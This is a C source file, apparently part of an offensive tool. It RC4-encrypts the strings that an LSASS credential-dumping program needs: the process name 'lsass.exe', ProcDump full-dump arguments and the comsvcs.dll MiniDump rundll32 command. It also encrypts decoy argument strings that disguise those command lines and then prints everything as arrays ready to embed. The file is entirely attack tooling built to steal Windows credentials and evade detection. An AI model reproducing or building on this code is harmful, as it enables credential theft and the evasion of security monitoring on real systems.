#include <Windows.h>
#include <stdio.h>

unsigned char rc4Key[] = {
		0x59, 0xF3, 0x3F, 0x99, 0xD2, 0x3D, 0x4E, 0x67, 0x29, 0xCC, 0xF8, 0x3A, 0x1F, 0x6A, 0x1B, 0xC3,
		0x34, 0xEA, 0x81, 0x0E, 0x36, 0x0D, 0xEA, 0xB2, 0x2D, 0x00, 0x38, 0x0B, 0xA6, 0x89, 0xC1, 0x7A };

// WCHAR needed for process name
WCHAR lsassExeStr[] = L"lsass.exe";

//WCHAR parentProcessStr[] = L"explorer.exe";

unsigned char procDumpArgs[] = {
	"-accepteula -ma"
};

// Dummy args can be anything, make sure it's long enough
WCHAR dummyProcDumpArgs[] = L"-accepteula -mp explorer.exe -o C:\\Dumps\\explorer_highusage.dmp -cpu 80 -mem 75% -interval 1m -duration 30m";

WCHAR comsvcsArgs[] = L"C:\\Windows\\System32\\rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump";

// this must start with C:\\Windows\\System32\\rundll32.exe
WCHAR dummyComsvcsArgs[] = L"C:\\Windows\\System32\\rundll32.exe OpenOptimizationControlPanel /cleanup:tempfiles /defrag:all-drives /optimize:startup /schedule:daily /report:";

VOID PrintHexData(LPCSTR Name, PBYTE Data, SIZE_T Size) {

	printf("unsigned char %s[] = {", Name);

	for (int i = 0; i < Size; i++) {
		if (i % 16 == 0) {
			printf("\n\t");
		}
		if (i < Size - 1) {
			printf("0x%0.2X, ", Data[i]);
		}
		else {
			printf("0x%0.2X ", Data[i]);
		}
	}

	printf("};\n\n");

}

typedef struct
{
	DWORD	Length;
	DWORD	MaximumLength;
	PVOID	Buffer;

} USTRING;

typedef NTSTATUS(NTAPI* fnSystemFunction032)(
	struct USTRING* Img,
	struct USTRING* Key
	);

BOOL Rc4EncryptionViaSystemFunc032(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {

	NTSTATUS	STATUS = NULL;

	USTRING		Key = { .Buffer = pRc4Key, 		.Length = dwRc4KeySize,	.MaximumLength = dwRc4KeySize },
		Img = { .Buffer = pPayloadData, .Length = sPayloadSize,	.MaximumLength = sPayloadSize };

	fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)GetProcAddress(LoadLibraryA("Advapi32"), "SystemFunction032");

	if ((STATUS = SystemFunction032(&Img, &Key)) != 0x0) {

		printf("[!] SystemFunction032 FAILED With Error : 0x%0.8X\n", STATUS);
		return FALSE;
	}

	return TRUE;
}

int main() {
	printf("In main file:\n\n");

	PrintHexData("rc4Key", rc4Key, sizeof(rc4Key));

	if (!Rc4EncryptionViaSystemFunc032(rc4Key, lsassExeStr, sizeof(rc4Key), sizeof(lsassExeStr))) {
		return -1;
	}
	PrintHexData("lsassExeStr", lsassExeStr, sizeof(lsassExeStr));

	//if (!Rc4EncryptionViSystemFunc032(rc4Key, parentProcessStr, sizeof(rc4Key), sizeof(parentProcessStr))) {
	//	return -1;
	//}
	//PrintHexData("parentProcessStr", parentProcessStr, sizeof(parentProcessStr));

	if (!Rc4EncryptionViaSystemFunc032(rc4Key, procDumpArgs, sizeof(rc4Key), sizeof(procDumpArgs))) {
		return -1;
	}
	PrintHexData("procDumpArgs", procDumpArgs, sizeof(procDumpArgs));

	if (!Rc4EncryptionViaSystemFunc032(rc4Key, dummyProcDumpArgs, sizeof(rc4Key), sizeof(dummyProcDumpArgs))) {
		return -1;
	}
	PrintHexData("dummyProcDumpArgs", dummyProcDumpArgs, sizeof(dummyProcDumpArgs));

	if (!Rc4EncryptionViaSystemFunc032(rc4Key, comsvcsArgs, sizeof(rc4Key), sizeof(comsvcsArgs))) {
		return -1;
	}
	PrintHexData("comsvcsArgs", comsvcsArgs, sizeof(comsvcsArgs));

	if (!Rc4EncryptionViaSystemFunc032(rc4Key, dummyComsvcsArgs, sizeof(rc4Key), sizeof(dummyComsvcsArgs))) {
		return -1;
	}
	PrintHexData("dummyComsvcsArgs", dummyComsvcsArgs, sizeof(dummyComsvcsArgs));

	printf("In Common.h:\n\n");

	printf("extern unsigned char rc4Key[%d];\n", sizeof(rc4Key));
	printf("extern unsigned char lsassExeStr[%d];\n", sizeof(lsassExeStr));
	//printf("extern unsigned char parentProcessStr[%d];\n", sizeof(parentProcessStr));
	printf("extern unsigned char procDumpArgs[%d];\n", sizeof(procDumpArgs));
	printf("extern unsigned char dummyProcDumpArgs[%d];\n", sizeof(dummyProcDumpArgs));
	printf("extern unsigned char comsvcsArgs[%d];\n", sizeof(comsvcsArgs));
	printf("extern unsigned char dummyComsvcsArgs[%d];\n", sizeof(dummyComsvcsArgs));
}